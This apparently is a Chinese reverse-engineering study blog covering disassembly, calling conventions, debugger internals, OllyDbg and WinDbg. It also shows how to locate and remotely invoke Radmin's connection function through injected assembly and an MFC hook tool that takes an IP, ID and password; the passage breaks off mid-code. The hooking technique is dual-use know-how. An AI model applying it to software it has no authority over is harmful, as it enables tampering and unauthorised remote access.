<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class MyTest</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    MyTest();</span><br><span class="line">    ~MyTest();</span><br><span class="line">    void SetTest(DWORD dwTest);</span><br><span class="line">    DWORD GetTest();</span><br><span class="line">public:</span><br><span class="line">    DWORD m_dwTest;</span><br><span class="line">&#125;;</span><br><span class="line"> MyTest::MyTest()</span><br><span class="line"> &#123;</span><br><span class="line">     printf(&quot;1111\r\n&quot;);</span><br><span class="line">     </span><br><span class="line"> &#125;</span><br><span class="line"> MyTest::~MyTest()</span><br><span class="line"> &#123;</span><br><span class="line">    printf(&quot;2222\r\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void MyTest::SetTest(DWORD dwTest)</span><br><span class="line">&#123;</span><br><span class="line">    this-&gt;m_dwTest = dwTest;   </span><br><span class="line">&#125;</span><br><span class="line">DWORD MyTest::GetTest()</span><br><span class="line">&#123;</span><br><span class="line">    return this-&gt;m_dwTest;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    MyTest Test;</span><br><span class="line">    Test.SetTest(1);　　　　　　</span><br><span class="line">    int Number = Test.GetTest();　　　　　　//添加了Set,Get方法,并调用</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155106258.png" alt="image-20230919155106258"></p>
<p>set 关键语句处</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155150318.png" alt="image-20230919155150318"></p>
<p>前两句：</p>
<p>ecx 是调用函数时传入的 this 指针，通过 [ebp-0x8] 将 eax 和 ecx 都变成了 this 指针</p>
<p>后两句：</p>
<p>ecx 是调用 set 传入的 1，复制给 this 指针，因为这里只有一个类变量，所以是 eax，如果由多个类变量，会出现 [eax+8] 这类通过 this 指针的偏移找到类变量的方式</p>
<p>get 关键处：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155536924.png" alt="image-20230919155536924"></p>
<p>前两句：</p>
<p>ecx 是调用函数时传入的 this 指针，通过 [ebp-0x8] 将 eax 和 ecx 都变成了 this 指针</p>
<p>mov eax,dword ptr ds:[eax]</p>
<p>把第一个成员变量的值给 eax 作为返回值带出，这样这个函数外面就能获取这个成员变量的值</p>
<h3 id="调用约定"><a class="markdownIt-Anchor" href="#调用约定">#</a> 调用约定</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/3b99957e628c42afa9c38c41c0145f6f.png" alt="img"></p>
<p>(1) 子程序的调用过程：调用者首先把参数压入堆栈，然后调用子程序，在完成后，由于堆栈中先前压入的参数不再有用，调用者或被调用者必须有一方把堆栈指针修正到调用前的状态，即堆栈平衡或平衡堆栈。</p>
<p>(2) 最右边的参数先入堆栈，还是最左边的参数先入堆栈。即：参数从右到左压入堆栈，还是从左到右压入堆栈。这需要约定。</p>
<p>(3) 有调用者修正堆栈，还是有被调用者修正堆栈。这也需要约定。</p>
<h3 id="寻找readmin对话call"><a class="markdownIt-Anchor" href="#寻找readmin对话call">#</a> 寻找 readmin 对话 call</h3>
<p>1.readmin 是 mfc 写的，mfc 的可以使用 spy++ 等查到句柄</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919174452707.png" alt="image-20230919174452707"></p>
<p>2. 通过 CreateThread 创建</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919175737730.png" alt="image-20230919175737730"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)</span><br><span class="line">.text:7DD734D5                 public CreateThread</span><br><span class="line">.text:7DD734D5 CreateThread    proc near               ; DATA XREF: .text:off_7DE1FA28</span><br><span class="line">.text:7DD734D5</span><br><span class="line">.text:7DD734D5 lpThreadAttributes= dword ptr  8</span><br><span class="line">.text:7DD734D5 dwStackSize     = dword ptr  0Ch</span><br><span class="line">.text:7DD734D5 lpStartAddress  = dword ptr  10h</span><br><span class="line">.text:7DD734D5 lpParameter     = dword ptr  14h</span><br><span class="line">.text:7DD734D5 dwCreationFlags = dword ptr  18h</span><br><span class="line">.text:7DD734D5 lpThreadId      = dword ptr  1Ch</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919220503043.png" alt="image-20230919220503043"></p>
<p>CreateThread 会调用 CreateRemoteThread</p>
<p>ret 0x18 是 push 参数的总大小  4 * 6 = 24 = 0x18。</p>
<p>4 因为内存对齐</p>
<p>3. 找到对话 call</p>
<p>对 CreateThread 下断</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221543018.png" alt="image-20230919221543018"></p>
<p>返回到调用处</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221633847.png" alt="image-20230919221633847"></p>
<p>向上回溯</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221957032.png" alt="image-20230919221957032"></p>
<p>4. 模拟登录 call</p>
<p>注意：这些值只在本次有效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line">mov esi,0x0F076A</span><br><span class="line">push 0x9c49    #功能号</span><br><span class="line">push 0x881064   # 结构体</span><br><span class="line">add ebp,0x3458</span><br><span class="line">push 0x00188B5C</span><br><span class="line">push 0x000F076A</span><br><span class="line">call 0x143f8e0</span><br><span class="line">add esp,10</span><br><span class="line">popfd</span><br><span class="line">popad</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919222940886.png" alt="image-20230919222940886"></p>
<h2 id="动态调试基础"><a class="markdownIt-Anchor" href="#动态调试基础">#</a> 动态调试基础</h2>
<h3 id="tls回调-fs0"><a class="markdownIt-Anchor" href="#tls回调-fs0">#</a> TLS 回调  fs:[0]</h3>
<p><strong>Fs:[0] 总是指向当前线程的 TIB，其中 0 偏移的指向线程的异常链表，即 ExceptionList 是指向异常处理链表（EXCEPTION_REGISTRATION 结构）的一个指针。</strong></p>
<p>SEH 结构为链表，fs:[0] 指向表头</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWlsYW5nL3AvMTEyMzM5MzUuaHRtbA==">结构化异常 SEH 处理机制详细介绍 (一） - 活着的虫子 - 博客园 (cnblogs.com)</span></p>
<h3 id="调试器原理"><a class="markdownIt-Anchor" href="#调试器原理">#</a> 调试器原理</h3>
<p>DR0~DR3 这四个寄存器是断点地址存储器，用于保存断点的地址<br>
 DR6 是调试状态寄存器用于指明 DR0~DR3 寄存器中哪一个产生了调试异常<br>
 DR6 寄存器使用比特位 B0<sub>B3 来指明 DR0</sub>DR3 中哪个产生了调试异常<br>
 DR7 是断点属性控制器<br>
 DR7 寄存器分别保存着 DR0~DR3 的断点地址对应的断点的属性，属性有如下几种:<br>
L0~L3: 这个比特位等于 1, 则断点为本地断点.<br>
G0~G3: 这个比特位等于 1, 则断点为全局断点.<br>
R/W0-R/W3:<br>
00：执行断点<br>
 01：数据写入断点<br>
 10：I/0 读写断点<br>
 11：读写断点 () 读取指令不算)</p>
<p>硬件断点可以避开常见 crc 校验和一些内存冗余，线程的校验。但是只有 DR0-DR3，所以最多只能同时存在 4 个</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919223808979.png" alt="image-20230919223808979"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919223914491.png" alt="image-20230919223914491"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[])</span><br><span class="line"> &#123;</span><br><span class="line">	 __asm&#123;int 3&#125;;</span><br><span class="line">	 return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919224401961.png" alt="image-20230919224401961"></p>
<p>程序运行到 int 3 会直接中断，但是调试器会捕捉到异常</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919233521676.png" alt="image-20230919233521676"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919224605639.png" alt="image-20230919224605639"></p>
<p>调试器实现的依赖.<br>
1.CPU 支持调试功能<br>
 1.1CPU 中，有标志寄存器 EFLAGS 的 IF,TF 标志位用于开启调试功能，如果一个进程是以调试状态开启，且其线程环境 (CONTEXT) 中的 EFLSGS 的 TF 标志位是 1, 那么这个进程执行一条指令后，将会产生一个异常，异常被处理后，TF 自动被重置为 0<br>
1.2CPU 有 DRx (DebugRegister) 系列的寄存器可用于断点功能.</p>
<p>关闭中断层支持 CPU 执行，hook 调试端口，导致 OD 无法调试。此时需要做 VT 调试器无痕断点</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/a65b1b14d4de4194962882b7e3ca9aa3.png" alt="img"></p>
<p>hd addr    # 删除 addr 处的硬件断点</p>
<p>hr addr     # 对 addr 设置硬件断点</p>
<p>硬件断点在程序加壳的时候比较有用</p>
<p>内存镜像 ALT+M   程序映射到内存中的所有数据</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919225902299.png" alt="image-20230919225902299"></p>
<h4 id="调试器原理-2"><a class="markdownIt-Anchor" href="#调试器原理-2">#</a> 调试器原理</h4>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db741d5bfeb2463ab082189506c28966.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>以调试创建一个进程或附加到一个进程</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateProcess</span>(<span class="comment">/*创建调试线程*/</span></span><br><span class="line">pszFilePath,<span class="comment">//可执行模块路径</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//命令行</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//线程属性是否可继承</span></span><br><span class="line">FALSE,<span class="comment">//否从调用进程处继承了句柄</span></span><br><span class="line">DEBUG_ONLY_THIS_PROCESS,<span class="comment">//启动方式,这里是以只调试的方式创建一个还没有运行的进程</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//新进程的环境块</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//新进程的当前工作路径（当前目录）</span></span><br><span class="line">&amp;stcStartupInfo,<span class="comment">//指定进程的主窗口特性</span></span><br><span class="line">&amp;stcProcInfo<span class="comment">//接收新进程的识别信息</span></span><br><span class="line">);</span><br><span class="line"><span class="number">2.</span>创建完进程后,需要安装个电话,等待调试子系统找上门来:</span><br><span class="line"></span><br><span class="line">typedefstruct_DEBUG_EVENT&#123;</span><br><span class="line">    DWORDdwDebugEventCode;<span class="comment">//发生异常的是什么事</span></span><br><span class="line">    DWORDdwProcessId;<span class="comment">//触发异常的进程ID(如果被调试进程有多个进程,这个ID有可能是其子进程的)</span></span><br><span class="line">    DWORDdwThreadId;<span class="comment">//触发异常的线程ID(如果被调试进程有多个线程,这个ID有可能是其中的一个线程的</span></span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        EXCEPTION_DEBUG_INFOException;<span class="comment">//异常类型信息</span></span><br><span class="line">        CREATE_THREAD_DEBUG_INFOCreateThread;<span class="comment">//创建线程时得到的信息结构体(有可能会创建多个线程)</span></span><br><span class="line">        CREATE_PROCESS_DEBUG_INFOCreateProcessInfo;<span class="comment">//创建进程时得到的信息结构体,有可能会得到多个</span></span><br><span class="line">        EXIT_THREAD_DEBUG_INFOExitThread;<span class="comment">//线程退出的信息结构体</span></span><br><span class="line">        EXIT_PROCESS_DEBUG_INFOExitProcess;<span class="comment">//进程退出的信息结构体</span></span><br><span class="line">        LOAD_DLL_DEBUG_INFOLoadDll;<span class="comment">//加载模块的信息结构体</span></span><br><span class="line">        UNLOAD_DLL_DEBUG_INFOUnloadDll;<span class="comment">//卸载模块的信息结构体</span></span><br><span class="line">        OUTPUT_DEBUG_STRING_INFODebugString;<span class="comment">//输出调试字串的信息结构体</span></span><br><span class="line">        RIP_INFORipInfo;<span class="comment">//系统调试错误时的信息结构体</span></span><br><span class="line">    &#125;u;<span class="comment">//这是一个联合体,dwDebugEventCode决定联合体中哪个字段是有用的.</span></span><br><span class="line">&#125;DEBUG_EVENT,*LPDEBUG_EVENT;</span><br><span class="line">DEBUG_EVENTstcDeEvent=&#123;<span class="number">0</span>&#125;;<span class="comment">//这是保存调试子系统发来的信息的结构体</span></span><br><span class="line"><span class="built_in">WaitForDebugEvent</span>(&amp;stcDeEvent,<span class="comment">//保存异常信息的结构体</span></span><br><span class="line">INFINIT<span class="comment">//等待时间</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="od"><a class="markdownIt-Anchor" href="#od">#</a> OD</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230920204144315.png" alt="image-20230920204144315"></p>
<p>A 区域:view 菜单功能项的快捷按钮</p>
<p>B+C+D+E+F: CPU 窗口 （OD 打开一个可执行文件后，会立刻加载，自动分析后并列出汇编代码，默认打开 CPU 窗口）</p>
<p>B 区域：反汇编面板窗口<br>
（分为 4 列从左至右依次是 Address,Hex dump,Disassembly,Comment）</p>
<ul>
<li>Address (地址): 显示被双击行的相对地址，再次双击返回便准地址模式；</li>
<li>Hex dump (十六进制机器码): 设置或取消无条件断点，对应的快捷键是 F2；</li>
<li>Disassembly (反汇编代码): 调用汇编器，可直接修改汇编代码，对应快捷键是空格。</li>
<li>Comment (注释): 允许增加或编辑注释，对应的快捷键是 &quot;;&quot;;</li>
<li>从键盘上选取多行，可按 Shift 和上下光标键（PgUp/PgDn）, 可以使用右键快捷菜单，可以按 Ctrl 键并按上下光标，可逐行滚动汇编窗口。（数据与代码混合时异常有用）</li>
</ul>
<p>C 区域：信息面板窗口</p>
<ul>
<li>在进行动态追踪时，信息面板窗口将显示与指令相关的各寄存器的值，API 函数调用提示和跳转提示等信息。</li>
</ul>
<p>D 区域：数据面板窗口</p>
<ul>
<li>以十六进制和字符方式显示文件在内存中的数据，要显示制定内存地址的数据，可单击右键快捷菜单中的 “Go to expression” 命令或者按 Ctrl+G 快捷键，打开地址窗口输入地址。</li>
</ul>
<p>E 区域：寄存器面板窗口</p>
<ul>
<li>显示 CPU 各寄存器的值，支持浮点，MMX,3DNow! 寄存器。可以右键或窗口标题切换显示寄存器的方式。</li>
</ul>
<p>F 区域：栈面板窗口</p>
<ul>
<li>显示栈的内容，即 ESP 指向地址的内容。将数据放入栈的称为入栈 (push)，从栈中取出数据的操作称为出栈 (pop)。API 函数和子程序都利用它传递参数和变量。</li>
</ul>
<h3 id="windbg"><a class="markdownIt-Anchor" href="#windbg">#</a> Windbg</h3>
<p><em>Windbg</em> 是 Microsoft 在 windows 平台下，强大的用户态和内核态调试工具。我们经常用它来分析 DUMP 文件，来解决线上服务器的疑难问题，比如 CPU 升高，内存溢出，响应时间慢等问题。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230920204531472.png" alt="image-20230920204531472"></p>
<p>为当前线程设置 int3 断点，调试器捕捉到 cc 的异常，程序停下来</p>
<p>g 运行</p>
<p>ctrl+break 中断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0:001&gt; bp kernel32!OpenProcess</span><br><span class="line">0:001&gt; u kernel32!OpenProcess</span><br><span class="line">kernel32!OpenProcess:</span><br><span class="line">76e11986 8bff            mov     edi,edi</span><br><span class="line">76e11988 55              push    ebp</span><br><span class="line">76e11989 8bec            mov     ebp,esp</span><br><span class="line">76e1198b 5d              pop     ebp</span><br><span class="line">76e1198c eb05            jmp     kernel32!OpenProcess+0xd (76e11993)</span><br><span class="line">76e1198e 90              nop</span><br><span class="line">76e1198f 90              nop</span><br><span class="line">76e11990 90              nop</span><br><span class="line">0:001&gt; u 76e11993</span><br><span class="line">kernel32!OpenProcess+0xd:</span><br><span class="line">76e11993 ff255409e176    jmp     dword ptr [kernel32+0x10954 (76e10954)]</span><br><span class="line">76e11999 90              nop</span><br><span class="line">76e1199a 90              nop</span><br><span class="line">76e1199b 90              nop</span><br><span class="line">76e1199c 90              nop</span><br><span class="line">76e1199d 90              nop</span><br><span class="line">kernel32!WaitForMultipleObjectsEx:</span><br><span class="line">76e1199e 8bff            mov     edi,edi</span><br><span class="line">76e119a0 55              push    ebp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="intel-vt"><a class="markdownIt-Anchor" href="#intel-vt">#</a> Intel-vt</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922214555478.png" alt="image-20230922214555478"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922214803315.png" alt="image-20230922214803315"></p>
<p>需要勾选</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922215228854.png" alt="image-20230922215228854"></p>
<h3 id="radmin-对话call模拟"><a class="markdownIt-Anchor" href="#radmin-对话call模拟">#</a> radmin 对话 call 模拟</h3>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">helpHook::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> dwOpenIP[MAX_PATH+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	CString strIP;</span><br><span class="line">	<span class="built_in">GetDlgItem</span>(IDC_EDIT1)-&gt;<span class="built_in">GetWindowText</span>(strIP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strIP.<span class="built_in">GetLength</span>()!=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">lstrcpyA</span>(dwOpenIP,strIP.<span class="built_in">GetString</span>());</span><br><span class="line"></span><br><span class="line">		CButton* radio_1=(CButton*)<span class="built_in">GetDlgItem</span>(IDC_RADIO1);</span><br><span class="line">		<span class="keyword">if</span> (radio_1-&gt;<span class="built_in">GetCheck</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;<span class="built_in">LoadIP</span>(<span class="number">0x9C49</span>,<span class="string">&quot;\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		CButton* radio_2=(CButton*)<span class="built_in">GetDlgItem</span>(IDC_RADIO2);</span><br><span class="line">		<span class="keyword">if</span> (radio_2-&gt;<span class="built_in">GetCheck</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;<span class="built_in">LoadIP</span>(<span class="number">0x9C4B</span>,<span class="string">&quot;\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		CButton* radio_3=(CButton*)<span class="built_in">GetDlgItem</span>(IDC_RADIO3);</span><br><span class="line">		<span class="keyword">if</span> (radio_3-&gt;<span class="built_in">GetCheck</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;<span class="built_in">LoadIP</span>(<span class="number">0x9C4C</span>,<span class="string">&quot;\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;<span class="built_in">MessageBox</span>(<span class="string">&quot;请输入要连接的IP&quot;</span>,<span class="string">&quot;提示&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Sleep(1000);</span></span><br><span class="line">	<span class="type">char</span> dwOpenUser[MAX_PATH+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	CString strUser;</span><br><span class="line">	<span class="built_in">GetDlgItem</span>(IDC_EDIT2)-&gt;<span class="built_in">GetWindowText</span>(strUser);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!strUser.<span class="built_in">GetLength</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;<span class="built_in">MessageBox</span>(<span class="string">&quot;请输入ID&quot;</span>,<span class="string">&quot;提示&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> dwOpenPassWord[MAX_PATH+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	CString strPassWord;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">GetDlgItem</span>(IDC_EDIT3)-&gt;<span class="built_in">GetWindowText</span>(strPassWord);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!strPassWord.<span class="built_in">GetLength</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;<span class="built_in">MessageBox</span>(<span class="string">&quot;请输入PassWord&quot;</span>,<span class="string">&quot;提示&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">lstrcpyA</span>(dwOpenUser,strUser.<span class="built_in">GetString</span>());</span><br><span class="line">	<span 